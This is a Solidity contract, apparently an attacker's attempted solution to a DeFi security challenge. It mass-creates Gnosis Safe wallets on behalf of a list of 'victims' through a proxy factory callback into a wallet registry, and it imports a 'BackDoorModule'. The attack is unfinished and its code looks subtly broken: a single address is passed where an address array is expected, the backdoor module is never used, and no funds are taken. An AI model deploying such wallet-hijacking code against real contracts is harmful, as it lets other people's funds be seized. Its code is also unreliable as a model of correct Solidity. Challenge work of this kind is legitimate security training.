pragma solidity 0.8.12;

import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {WalletRegistry} from "./WalletRegistry.sol";
import {BackDoorModule} from "./BackDoorModule.sol";

// Your contract
contract WalletCreator {
    // Address of the Gnosis Safe master copy contract
    address immutable gnosisSafeMasterCopy;

    // Address of the Gnosis Safe proxy factory contract
    address immutable gnosisSafeProxyFactory;

    address immutable fallbackHandler;

    address immutable paymentToken;

    WalletRegistry immutable walletRegistry;

    BackDoorModule immutable backdoormodule;

    address[] private _victims;

    uint256 private constant MAX_THRESHOLD = 1;

    constructor(
        address gnosisSafeMasterCopy_,
        address gnosisSafeProxyFactory_,
        WalletRegistry walletRegistry_,
        address[] memory victims_,
        address fallbackHandler_,
        address paymentToken_,
        address payable backdoormodule_
    ) {
        gnosisSafeMasterCopy = gnosisSafeMasterCopy_;
        gnosisSafeProxyFactory = gnosisSafeProxyFactory_;
        walletRegistry = walletRegistry_;
        _victims = victims_;
        fallbackHandler = fallbackHandler_;
        paymentToken = paymentToken_;
        backdoormodule = BackDoorModule(backdoormodule_);
    }

    // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
    // A fallback handler can be replaced or extended anytime via a regular Safe transaction
    // (respecting threshold and owners of the Safe).
    function createGnosisSafeWallet() public {
        uint256 counter = 0;
        for (counter; counter < _victims.length; counter++) {
            //  await safe.setup([user1.address, user2.address], 1, AddressZero, "0x", handler.address, AddressZero, 0, AddressZero)
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                _victims[counter],
                MAX_THRESHOLD,
                address(0),
                0x0,
                fallbackHandler,
                address(0),
                0,
                address(0)
            );

            // Create a unique nonce for the proxy contract
            uint256 saltNonce = uint256(
                keccak256(abi.encodePacked(block.timestamp, msg.sender))
            );

            // Call the createProxyWithCallback function to create the proxy contract
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(
                gnosisSafeProxyFactory
            ).createProxyWithCallback(
                    address(gnosisSafeMasterCopy), // The singleton contract
                    initializer, // The initializer data
                    saltNonce, // The nonce
                    walletRegistry // The callback contract
                );
        }
    }
}
